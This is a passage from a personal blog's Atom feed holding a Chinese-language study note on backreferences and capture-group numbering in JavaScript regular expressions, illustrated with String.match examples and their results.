      <category term="百度ife" scheme="http://blog.minfive.com/tags/%E7%99%BE%E5%BA%A6ife/"/>
    
  </entry>
  
  <entry>
    <title>关于Javascript正则的&#39;反向引用&#39;</title>
    <link href="http://blog.minfive.com/2016/03/09/%E5%85%B3%E4%BA%8EJavascript%E6%AD%A3%E5%88%99%E7%9A%84&#39;%E5%8F%8D%E5%90%91%E5%BC%95%E7%94%A8&#39;/"/>
    <id>http://blog.minfive.com/2016/03/09/关于Javascript正则的&#39;反向引用&#39;/</id>
    <published>2016-03-08T16:00:00.000Z</published>
    <updated>2019-03-31T13:29:01.745Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：一直忙着找实习单位，有几月没有写过博客，也没有学习过，终于找到一个勉强合适的，还是赶紧加油吧，别被别人甩太远了！ 本来是在看着阿树博客里的jQuery规范的，不知道怎么搞得，稀里糊涂的就看到正则去了，把学到的东西总结一下。</p></blockquote><hr><h3 id="首先先看下面这个例子："><a href="#首先先看下面这个例子：" class="headerlink" title="首先先看下面这个例子："></a>首先先看下面这个例子：</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"abcd"</span>.match(<span class="regexp">/(a(bc)d)/</span>);</span><br><span class="line"><span class="comment">//result: ["abcd", "abcd", "bc"]</span></span><br></pre></td></tr></table></figure><p>这个例子说明看括号匹配顺序是按<strong>左括号</strong>计算的。（这是别人的理解，我的理解是匹配顺序是按<strong>从外到里从左到右</strong>计算的，每个反向引用都由一个编号或名称来标识，并通过“\编号”表示法进行引用，外面的组的编号靠前。也就是说引用分组是编号排列是<strong>从外到内</strong>编排。）</p><h3 id="再看这个例子"><a href="#再看这个例子" class="headerlink" title="再看这个例子"></a>再看这个例子</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'aaa'</span>.match(<span class="regexp">/(a\1)/</span>);</span><br><span class="line"><span class="comment">//result: ['a']  </span></span><br><span class="line"><span class="string">'aaaaaaa'</span>.match(<span class="regexp">/(a\1\1\1\1\1)/</span>);  </span><br><span class="line"><span class="comment">//result: ['a']</span></span><br></pre></td></tr></table></figure><p>由这个例子可以看出<code>/(a\1)/</code>在第一个括号中使用<code>\1</code>引用是没有意义的，同时在chrome中的测试结果表明，无论在第n个括号中有几个<code>\n</code>都会被忽略。（既从最外层括号往里层数）</p><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>基于上述两个例子的解读，咱们可以把下边的例子进行转换</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/[abc]\1/g</span>);<span class="comment">//null  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/([abc])\1/g</span>);<span class="comment">//["aa", "bb", "cc"]  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/(([abc])\1)\1/g</span>);<span class="comment">//["aa", "bb", "cc"]  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/(([abc])\1)\2/g</span>);<span class="comment">//["aa", "bb", "cc"]  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/((([abc])\1)\2)\3/g</span>);<span class="comment">//["aaa", "bbb", "ccc"]</span></span><br></pre></td></tr></table></figure><p>可简化为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/[abc]\1/g</span>);<span class="comment">//null  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/([abc])\1/g</span>);<span class="comment">//["aa", "bb", "cc"]  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/(([abc]))\1/g</span>);<span class="comment">//["aa", "bb", "cc"]  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/(([abc]))\2/g</span>);<span class="comment">//["aa", "bb", "cc"]  </span></span><br><span class="line"><span class="string">'aaabbbcccdddeeefff'</span>.match(<span class="regexp">/((([abc]))\2)\3/g</span>);<span class="comment">//["aaa", "bbb", "ccc"]</span></span><br></pre></td></tr></table></figure><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="https://segmentfault.com/q/1010000000580762" target="_blank" rel="noopener">如何理解javascript正则“反向引用”</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前言：一直忙着找实习单位，有几月没有写过博客，也没有学习过，终于找到一个勉强合适的，还是赶紧加油吧，别被别人甩太远了！ 本来是在看着阿树博客里的jQuery规范的，不知道怎么搞得，稀里糊涂的就看到正则去了，把学到的东西总结一下。&lt;/p&gt;
&lt;/blo
      
    
    </summary>
    
      <category term="日常学习" scheme="http://blog.minfive.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="javascript" scheme="http://blog.minfive.com/tags/javascript/"/>
    
      <category term="学习" scheme="http://blog.minfive.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
</feed>
